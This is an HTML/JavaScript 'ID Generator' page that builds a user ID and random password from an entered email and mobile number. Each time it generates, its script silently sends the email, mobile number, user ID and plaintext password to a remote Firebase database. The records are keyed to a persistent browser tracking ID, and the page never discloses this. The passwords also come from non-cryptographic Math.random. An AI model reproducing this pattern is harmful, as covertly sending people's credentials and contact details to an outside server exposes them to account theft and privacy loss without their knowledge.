<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ID Generator</title>

<style>
body{
  background:#eef2f5;
  font-family:Arial, sans-serif;
  display:flex;
  justify-content:center;
  padding:20px;
}
.container{
  background:#fff;
  width:100%;
  max-width:420px;
  padding:20px;
  border-radius:10px;
  box-shadow:0 0 12px rgba(0,0,0,.15);
}
h2{text-align:center}
input, textarea, button{
  width:100%;
  padding:10px;
  margin-top:10px;
  font-size:14px;
}
.row{display:flex;gap:6px}
button{
  background:#007bff;
  color:#fff;
  border:none;
  cursor:pointer;
  border-radius:6px;
}
button.copied{background:#28a745}
textarea{height:100px;resize:none}
input[readonly]{background:#f5f5f5}
</style>
</head>
<body>

<div class="container">
  <h2>ID Generator</h2>

  <input type="email" id="email" placeholder="Enter Email">
  <input type="text" id="mobile" placeholder="Enter Mobile Number">

  <button onclick="generate()">Generate</button>

  <div class="row">
    <input id="pass" readonly placeholder="Password">
    <button onclick="copyText(this,'pass')">Copy</button>
  </div>

  <div class="row">
    <input id="userid" readonly placeholder="User ID">
    <button onclick="copyText(this,'userid')">Copy</button>
  </div>

  <div class="row">
    <input id="phone" readonly placeholder="Mobile">
    <button onclick="copyText(this,'phone')">Copy</button>
  </div>

  <div class="row">
    <input id="mailout" readonly placeholder="Email">
    <button onclick="copyText(this,'mailout')">Copy</button>
  </div>

  <button onclick="copyAll(this)">ALL COPY</button>

  <textarea id="final" readonly placeholder="Final Output"></textarea>
</div>

<!-- FIREBASE -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>
/* üî• FIREBASE CONFIG */
firebase.initializeApp({
  apiKey: "AIzaSyCrnG8iz_JUgqiG8zVStqKBpicOF4m2SB0",
  authDomain: "iruserid-5c557.firebaseapp.com",
  databaseURL: "https://iruserid-5c557-default-rtdb.firebaseio.com",
  projectId: "iruserid-5c557",
  storageBucket: "iruserid-5c557.firebasestorage.app",
  messagingSenderId: "234438715803",
  appId: "1:234438715803:web:2f254753f6b6827d6a193e"
});

const db = firebase.database();

/* üß† UNIQUE BROWSER ID */
let containerId = localStorage.getItem("containerId");
if(!containerId){
  containerId = "browser_" + Math.random().toString(36).substring(2,10);
  localStorage.setItem("containerId", containerId);
}

/* üîê PASSWORD */
function generatePassword(){
  const upper="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const lower="abcdefghijklmnopqrstuvwxyz";
  const number="0123456789";
  const special="@#$%&!";
  const all = upper + lower + number + special;

  let pass =
    upper[Math.floor(Math.random()*upper.length)] +
    lower[Math.floor(Math.random()*lower.length)] +
    number[Math.floor(Math.random()*number.length)] +
    special[Math.floor(Math.random()*special.length)];

  const len = Math.floor(Math.random()*(15-8+1))+8;
  while(pass.length < len){
    pass += all[Math.floor(Math.random()*all.length)];
  }
  return pass.split('').sort(()=>0.5-Math.random()).join('');
}

/* ‚ö° GENERATE */
function generate(){
  const email = emailInput = document.getElementById("email").value.trim();
  const mobile = document.getElementById("mobile").value.trim();
  if(!email || !mobile){
    alert("Email & Mobile required");
    return;
  }

  const name = email.split("@")[0].replace(/[^a-zA-Z]/g,"").toLowerCase();
  const digits = Math.floor(10 + Math.random()*90);
  const letters="abcdefghijklmnopqrstuvwxyz";
  const userId = name + digits +
    letters[Math.floor(Math.random()*26)] +
    letters[Math.floor(Math.random()*26)];

  const password = generatePassword();

  pass.value = password;
  userid.value = userId;
  phone.value = mobile;
  mailout.value = email;

  final.value = `${userId}\n${password}\n${mobile}\n${email}`;

  db.ref("users/"+containerId+"/activity").push({
    email,
    mobile,
    userid: userId,
    password,
    time: Date.now()
  });
}

/* üìã COPY */
function copyText(btn,id){
  navigator.clipboard.writeText(document.getElementById(id).value);
  btn.classList.add("copied");
  setTimeout(()=>btn.classList.remove("copied"),1200);
}
function copyAll(btn){
  navigator.clipboard.writeText(final.value);
  btn.classList.add("copied");
  setTimeout(()=>btn.classList.remove("copied"),1200);
}
</script>

</body>
</html>
